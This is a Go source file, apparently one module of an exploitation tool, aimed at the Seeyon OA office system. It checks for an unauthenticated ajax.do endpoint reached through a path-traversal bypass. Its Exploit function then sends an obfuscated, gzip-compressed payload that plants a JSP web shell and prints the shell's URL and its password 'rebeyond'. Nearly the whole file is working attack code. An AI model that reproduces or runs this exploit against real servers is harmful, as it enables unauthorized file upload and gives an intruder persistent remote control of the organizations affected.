package vulners

import (
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"strings"
)

type Sy04 struct {
}

func (s *Sy04) Scan(targetUrl string) {
	vulnerable, err := sy04scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[+]存在ajax.do未授权&任意文件上传")
	} else {
		color.White("[-]不存在ajax.do未授权&任意文件上传")
	}
}

func (*Sy04) Exploit(targetUrl string) {
	runResult, err := sy04runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.White(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果.")
	}
}

func sy04scancore(targetUrl string) (bool, error) {
	scancorePayload := "/seeyon/thirdpartyController.do.css/..;/ajax.do"
	req, err := http.NewRequest("GET", targetUrl+scancorePayload, nil)
	if err != nil {
		return false, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 404 {
		return false, nil
	} else {
		return true, nil
	}
}

func sy04runcore(targetUrl string) (string, error) {
	runcorePayload := "managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%22%C3%8A%C3%98%C3%AE%C3%84%1EZ%5B%11QTP%5E%1B%7B%C2%80%2A%C2%84%C3%82%2A%60%C3%A5%21e%C3%87%C3%BC%C3%B7-%C3%84%C2%9E%C3%AE%C2%89%C3%AD%C2%ADKfee%7E%C2%95%C3%AF%C2%BF%5E%C3%9B%C3%87%C3%A4L%0A%C3%AC%C3%AEi%C3%AA%C2%B7%C3%BF%C3%A0%C3%BA_%C2%B87%C2%89%C3%AA%C2%92Z%C3%92%C3%8E%C3%BD%2Co%C2%BF%C2%8BgUz%C3%B6%C2%B3%0C%25q%C3%BD%C2%A8%C3%A7g%14%07%5C%C3%AA%C3%A6%21%C3%B7%27%C3%97%C3%AAv%7B%17%C3%9Fs%C3%934%C3%ABe%C2%BEO%C2%93%C2%B8%07%12B%18%C2%81%7E%C2%86%C2%82%C3%98%3F%C3%B7R7%C3%B0W.M%C2%8A%C2%BC%C3%97%C3%BA%C3%BE%3B%C3%97%C2%9C%C3%9F%22%C2%B7t%C2%BB%28%C3%A9n%19Zn%C2%9EQ%C3%AE%C2%9F%C2%B9%C3%B4%C2%9D%17%18v%C3%AC_%C2%B8O%C3%94%3A%C3%B5%C3%97%C2%8F-r%C2%8E%C2%BBQ%C2%96V%C2%AD%C2%87%C2%9F%C2%A0%C3%9C%C3%9D%C2%B7%2C%C3%B41%C2%AE%C2%9D%C3%9BJ%C3%A9%15%C2%BC%C2%A4%C3%94%13%C3%86%C2%BC%C2%BC%08sO%12%C2%AF%1BR%C3%8Bx%C3%A4.4%1E%C2%BC%24%C3%A5JHCHf%05%18%18%C3%85%C2%8A%C2%A8%C2%A5%C2%A7%C2%8F%C2%95C%C3%BF%C2%B9%3CH%C3%B3%C3%98%C3%91%C3%A5%00%12%C2%83%02%01%C2%97%5E%C3%84%C2%A3%C2%B5%3E%C2%A4r4%7Crc%C3%B5%C2%B2%21Z%0A%C2%88%11A%09%0B%C2%8E.%5El%13bY%C3%829%C2%90%C3%86%14%C3%96%C3%B8d.%C3%98%C2%BA%C3%98g%C3%AF%C3%99%0A%25%C3%99%C3%ADn%05%C2%85%3DX%C2%8A%60%C2%A1%C2%95%C2%9F%C3%8A%18%C2%AEc%C2%AE%0B%05%C3%89%C3%A56%C2%AA%C3%BE%01%C2%83%C3%A7o%C2%8EdD%C2%9E4%C2%A7%C2%B6%C2%A5%C2%A5%C2%9E0%7C%C2%94%255%C2%B3-%C3%B5%2A%C3%8F%0F%C2%81c%C2%85%C2%BCc%C2%8A%27%40%27%2FL%C3%A7%0A%C3%B8%C2%AA%C2%B4M%0D%C2%8387%C2%94Y%C2%A3%C2%B7%C2%97%C3%86%21%C3%83%C2%A0%C2%B2%C2%B4N%C3%BD%C2%81%C3%9A%07%C2%8CW%18%C2%BF%19%C3%B4%2F%C3%90%5Cf%C2%AE%C2%B9%0EvB%15%C2%82%C3%81%3Aph%C2%88%7CK%C3%83%C3%B2%3C%C2%876%C3%82%23%16%1F%0F%C2%ADe%21%2F%1A%C2%BB%15%C3%91%C2%B0Cp%C3%A1%1C%1AlE%C2%92%C2%B3%C3%B5%C2%B4B%2BRa%C2%8F%40%C3%9E%C2%9D%C2%9EFG%C2%8B%7Fb9%C2%AD%C3%B3%7Er%C3%8CZo%19%C2%B2%1C%C2%B0%C3%BC%C3%9D%C3%B3%16%C2%AB%11+%C3%B8%02%C2%A5%0A%C3%83%17q%0F%17%C3%8B%C3%94%23+p%C2%AF%3Cr%C3%B6%C2%BB%C2%BE%C2%B3_%C3%93%C2%8D%C3%A9%60%3B2N%C2%9B%C2%BD%C3%9C%C2%B7%C2%91%3C%02%C2%82q%C2%BD%C3%95%00%C2%89%17hi%C2%A6mV%7DG%0F%10%C3%94%C3%A5%C3%8C%C2%A5%C2%A7%C3%91N%C3%80%17%C2%B7%C2%89q%C3%BC%C3%86%C2%AF%08%C3%84p%C2%86Y%5D%C2%B5%C3%90%23%2AV%C2%A6%C3%8B%C2%89f%C2%AC%C2%91%C2%B2%C3%8F%C2%A3%15%C2%8B%C3%81%C2%B5v%C3%89%1AU%C2%85c%C2%81%C3%A0+%18Q%1D%C2%AB.%18%C3%A2a0%C3%816%0D%C2%92%0F%7F%C3%86%C3%8E%C2%AF%7F%C2%A6%0A%C2%95%C2%91%C2%A2%C3%9F%C3%A4%C3%93%3A_%C2%80%06%C3%A9%C3%AA%0D_%3F%C2%8D%3Cb%0CX%7D%12%28%C2%85%29%C2%A07%C2%BD%C2%A6%3E%C2%B5%C3%9E%C3%8D%C2%AF_k%C2%A3LOL%0E%12%C2%9B%C2%8A%27%C2%8FwX%3E%C3%A6%C2%99%22%C2%89%18%C3%92%C3%89%15%C2%9A%C3%83%C3%823%C3%B1%C2%95%C2%BDMw%C2%86%3AW%23m%C3%86%C3%B2Z%C3%9E%C3%AD%C2%8A%5B%7F%08%1A%C3%9E%C3%85%06qX%C2%AF%2A%C2%8B%25%06%C2%96%C2%81%C3%81%60W8%C2%82%C3%81%1F%C2%88%C3%B1%C3%B6G%01j%C2%9E%C2%8D%C2%B3G%0E%09%C3%B33e1%C2%B0%C3%B8%C3%A1%C3%92%C2%8BU%C3%9E6%C3%85%C2%88%C3%85%C3%87%C3%BC0%2Ah%C3%8E3%40%C3%83%5BO%C3%AF%C2%84q%01%25c%08Ym%C2%B7%C3%93%C3%B1%C2%AD%27%C2%81%C2%A0R%C3%97%C2%9A%C3%B0%C2%9Ed%C3%B0%C3%9B%C3%A8R6u%5D%C2%96%C3%9E%60%C3%B7%C3%B8%3E%C3%A3%5CV%C3%84%5D%C2%822%C3%90%C2%9D%3C%C3%AB%C2%B3o%C3%83%17%1F%24%C2%90%C2%8D9%C2%BC%C3%93f%C3%82%3FW%C3%AA%C3%BCw%C2%AA%1B%C2%B3%C3%BB%C2%A5%C2%B1m.%C2%9D%3B%60%C2%B7%C2%A1%C2%93%C3%A2xd%00%C2%B7%25%C3%B0%C3%B0%C2%A5u%C3%98%C3%8F%C2%BF%3E%7D%5C%12%1F%C2%B7L%C3%B7v%C3%81q%C3%A7%23%C3%B8%C3%BF%C3%A9%02%C2%9Cd%3Es%C3%AC%C3%87%C3%B7zA2%06%C3%BAG.%C3%8B%C3%9D%1C%01%C2%AE%C2%AA%C2%AA%C3%8E%C3%83k%C3%BB%07%C3%9B%C2%9Als%C2%BE%C3%964%3F%17%7E%C3%BB%C3%AF%7F%01-%C2%A9%C2%AB%26p%05%00%00"
	req, err := http.NewRequest("POST", targetUrl+"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip", strings.NewReader(runcorePayload))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	resContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if strings.Contains(string(resContent), "\"message\":null") {
		return targetUrl + "/seeyon/common/designer/pageLayout/mrn.jsp，密码rebeyond", nil
	} else {
		return "", nil
	}
}
